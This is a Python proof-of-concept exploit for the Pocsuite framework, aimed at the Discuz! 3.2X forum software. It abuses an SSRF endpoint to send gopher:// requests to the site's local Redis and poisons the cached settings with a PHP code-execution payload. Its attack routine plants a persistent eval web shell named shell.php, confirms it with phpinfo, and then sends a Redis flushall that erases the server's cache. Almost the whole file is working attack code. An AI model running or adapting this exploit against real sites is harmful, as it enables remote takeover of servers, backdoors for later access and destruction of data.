#!/usr/bin/env python
# code:utf-8

import string
import random
import hashlib
import base64
import urlparse

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '91879'  # ssvid
    version = 'beta'
    author = ['whoam1']
    vulDate = '2016-06-21'
    createDate = '2016-06-23'
    updateDate = '2016-06-23'
    references = ['https://www.seebug.org/vuldb/ssvid-91879']
    name = 'Discuz_ssrf_redis_codeexec.'
    appPowerLink = 'http://www.discuz.net'
    appName = 'Discuz!'
    appVersion = '3.2X'
    vulType = 'Code Execution'
    desc = '''
        Discuz_ssrf_redis_codeexec.
    '''
    samples = ['']
    install_requires = ['']
    

    def _attack(self):
        result = {}
        ssrf_url = "ssrf.php?ssrf=" #对应dz文件

        payload = ('gopher://127.0.0.1:6379/'\
                   '_eval "local t=redis.call(\'keys\',\'*_setting\');'\
                   'for i,v in ipairs(t) do redis.call(\'set\',v,'\
                   '\'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";'\
                   'a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";'\
                   's:5:\\\"/^./e\\\";}s:7:\\\"replace\\\";'\
                   'a:1:{s:7:\\\"plugins\\\";s:34:\\\"eval(base64_decode(\$_REQUEST[a]));\\\";}}}'\
                   's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'\
                   ' end;return 1;" 0 %250D%250Aquit')

        web_url = self.url.rpartition('/')
        self.url = web_url[0]+ '/' + web_url[2] + '/'
        vul_url = self.url + ssrf_url + payload
        base_rep = req.get(vul_url)
        web_url = self.url.rpartition('/')
        while base_rep.status_code == 200:
            shell_url = self.url + '/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
            rep = req.get(shell_url)
            if rep.status_code == 200:
                shell_payload = 'file_put_contents("shell.php","<?php @eval(\$_REQUEST[she1l]);?>");'
                shell_payload_b64 = base64.b64encode(shell_payload)    
                attack_url= shell_url + '&a=' + shell_payload_b64               
                req.get(attack_url)
                flag = "phpinfo";
                shell_url = web_url[0] + '/' + 'shell.php'
                verify_url = shell_url + "?she1l=phpinfo();"
                rep = req.get(verify_url)
                if rep.status_code == 200 and flag in rep.content:
                    result['ShellInfo'] = {}
                    result['ShellInfo']['URL'] = shell_url
                    result['ShellInfo']['Content'] = '@eval($_REQUEST[she1l]);'

                    #后台内存清理
                    payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
                    recover_url = self.url + ssrf_url +payload_flush
                    req.get(recover_url)
                    req.get(web_url[0] + '/forum.php')
                break
                web_url = web_url[0].rpartition('/')
        return self.parse_output(result)
        return self.parse_output(result)

    def _verify(self):
        '''
            本地搭建ssrf.php,验证PoC
        '''
        ssrf_url = "ssrf.php?ssrf=" #
        result = {}  

        payload = ('gopher://127.0.0.1:6379/'\
                   '_eval "local t=redis.call(\'keys\',\'*_setting\');'\
                   'for i,v in ipairs(t) do redis.call(\'set\',v,'\
                   '\'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";'\
                   'a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";'\
                   's:5:\\\"/^./e\\\";}s:7:\\\"replace\\\";'\
                   'a:1:{s:7:\\\"plugins\\\";s:10:\\\"phpinfo();\\\";}}}'\
                   's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'\
                   ' end;return 1;" 0 %250D%250Aquit')

        web_url = self.url.rpartition('/') 
        self.url = web_url[0]+ '/' + web_url[2] + '/'
        vul_url = self.url + ssrf_url + payload
        base_rep = req.get(vul_url)
        
        while base_rep.status_code == 200:
            verify_url = self.url + '/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
            rep = req.get(verify_url)
            flag = 'phpinfo';

            if flag in rep.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = verify_url
                payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
                recover_url = self.url + ssrf_url + payload_flush
                req.get(recover_url)
                req.get(web_url[0] + '/forum.php')

                break

            web_url = web_url[0].rpartition('/')

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
